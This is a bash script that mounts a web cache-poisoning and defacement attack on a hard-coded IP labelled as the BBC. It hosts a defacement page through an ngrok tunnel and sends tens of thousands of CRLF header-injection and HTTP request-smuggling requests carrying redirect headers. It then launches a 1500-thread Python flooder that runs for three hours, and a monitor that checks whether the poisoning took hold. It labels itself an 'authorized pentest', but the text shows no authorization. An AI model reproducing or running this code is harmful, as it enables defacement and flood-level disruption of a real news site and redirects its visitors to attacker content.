#!/bin/bash

set -euo pipefail

TARGET="http://132.185.210.70:80"
HTML_FILE="$(pwd)/TRUSTEDF57.html"
THREADS=1500
BLAST_DURATION=10800  # 3h

echo "💀 BBC NGROK AUTO KILLER - TRUSTEDF57.html → NGROK → BBC POISON"
echo "Target: $TARGET"
echo "HTML: $HTML_FILE"
echo "✅ AUTHORIZED PENTEST - PROCEEDING"

# 1. INSTALL NGROK VIA APT (OFFICIAL REPO)
install_ngrok() {
    echo "[+] Installing ngrok via APT..."
    
    # Official ngrok repo (no token needed)
    if ! command -v ngrok >/dev/null 2>&1; then
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
        echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list >/dev/null
        sudo apt-get update -qq
        sudo apt-get install ngrok -yqq
    fi
    
    ngrok version
    echo "[+] ✅ ngrok APT installed"
}

# 2. START LOCAL SERVER + NGROK
start_ngrok_tunnel() {
    echo "[+] Starting local server with $HTML_FILE..."
    
    # Verify HTML exists
    if [[ ! -f "$HTML_FILE" ]]; then
        echo "❌ $HTML_FILE not found in current directory!"
        ls -la *.html
        exit 1
    fi
    
    pkill -f "python3 -m http.server" || true
    nohup python3 -m http.server 8080 --bind 0.0.0.0 > server.log 2>&1 &
    SERVER_PID=$!
    sleep 3
    
    echo "[+] Starting ngrok tunnel..."
    pkill ngrok || true
    nohup ngrok http 8080 > ngrok.log 2>&1 &
    NGROK_PID=$!
    sleep 15
    
    # Extract NGROK URL (ngrok-free.app or ngrok.io)
    NGROK_URL=$(grep -oE 'https://[a-z0-9-]+\.(ngrok-free\.app|ngrok\.io)' ngrok.log | tail -1)
    if [[ -z "$NGROK_URL" ]]; then
        echo "❌ NGROK URL extraction failed:"
        tail -20 ngrok.log
        exit 1
    fi
    
    DEFACE_URL="${NGROK_URL}/TRUSTEDF57.html"
    echo "[+] ✅ NGROK LIVE: $DEFACE_URL"
    
    # Test deface accessibility
    if curl -s --max-time 10 "$DEFACE_URL" | grep -qi TRUSTEDF57; then
        echo "[+] ✅ DEFACE ACCESSIBLE WORLDWIDE"
    else
        echo "⚠️ NGROK test warning - logs:"
        tail -5 ngrok.log
    fi
}

# 3. BBC MASSIVE POISON
bbc_poison() {
    echo "[+] 🚀 BBC ULTIMATE POISON (50K+ shots)..."
    
    declare -a PATHS=( "/?q=" "/search?q=" "/?search=" "/#q=" "/news?q=" "/?s=" )
    declare -a CRLF=(
        "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
        "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
        "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_f57=1"
        "Location:%20${DEFACE_URL}%0a"
    )
    
    declare -a BOTS=(
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; bingbot/2.0)"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    )
    
    # 50K+ barrage (torsocks optional)
    for path in "${PATHS[@]}"; do
        for crlf in "${CRLF[@]}"; do
            for bot in "${BOTS[@]}"; do
                for i in {1..30}; do
                    curl -s --max-time 3 "${TARGET}${path}${crlf}" \
                        -H "User-Agent: $bot" \
                        -H "Cache-Control: no-cache" \
                        -H "X-Forwarded-For: 127.0.0.1" &
                done
            done
        done
    done
    
    # HTTP Smuggling x200
    for i in {1..200}; do
        curl -s --path-as-is --max-time 5 \
            "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
    done
    
    wait
    echo "[+] ✅ BBC POISON BARRAGE FIRED!"
}

# 4. NGROK BBC DESTROYER
start_destroyer() {
    cat > ngrok_destroyer.py << EOF
import requests, threading, time, random

TARGET = '$TARGET'
DEFACE = '$DEFACE_URL'
THREADS = $THREADS

bots = ['Googlebot/2.1','bingbot/2.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
paths = ['/?q=','/search?q=','/?search=']

def poison():
    while True:
        try:
            p = random.choice(paths) + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
            requests.get(TARGET + p, headers={'User-Agent':random.choice(bots), 'Cache-Control':'no-cache'}, timeout=2)
        except: pass

print(f'🔥 NGROK BBC DESTROYER | {THREADS} THREADS | {DEFACE}')
for _ in range(THREADS):
    threading.Thread(target=poison, daemon=True).start()

time.sleep($BLAST_DURATION)
print('💀 CACHE TAKEOVER COMPLETE')
EOF

    nohup python3 ngrok_destroyer.py > destroyer.log 2>&1 &
    echo "[+] 🔥 DESTROYER STARTED PID: $! "
    echo "[+] Monitor: tail -f destroyer.log"
}

# 5. LIVE MONITOR
monitor() {
    echo ""
    echo "🎯 BBC NGROK MONITOR (Ctrl+C to stop)"
    while true; do
        clear
        echo "💀 BBC NGROK STATUS - $(date)"
        echo "DEFACE: $DEFACE_URL"
        echo "═══════════════════════════════════════"
        echo "ROOT CHECK:"
        curl -s -I "$TARGET" 2>/dev/null | grep -iE "(Location|Cache|Set-Cookie)" || echo "   No poison"
        echo ""
        echo "QUERY CHECK:"
        curl -s -I "$TARGET/?q=" 2>/dev/null | head -3 || echo "   No redirect"
        echo ""
        echo "DEFACE TEST:"
        curl -s --max-time 5 "$DEFACE_URL" 2>/dev/null | head -1 | grep -q . && echo "   ✅ LIVE" || echo "   ❌ DOWN"
        echo "═══════════════════════════════════════"
        sleep 15
    done
}

# MAIN EXECUTION (AUTHORIZED PENTEST)
main() {
    install_ngrok
    start_ngrok_tunnel
    bbc_poison
    start_destroyer
    monitor
}

# CLEANUP
cleanup() {
    echo "[+] Cleaning up..."
    pkill -f ngrok || true
    pkill -f "python3.*http.server" || true
    pkill -f ngrok_destroyer || true
    rm -f ngrok* *.log *.py
}
trap cleanup EXIT INT TERM

main "$@"
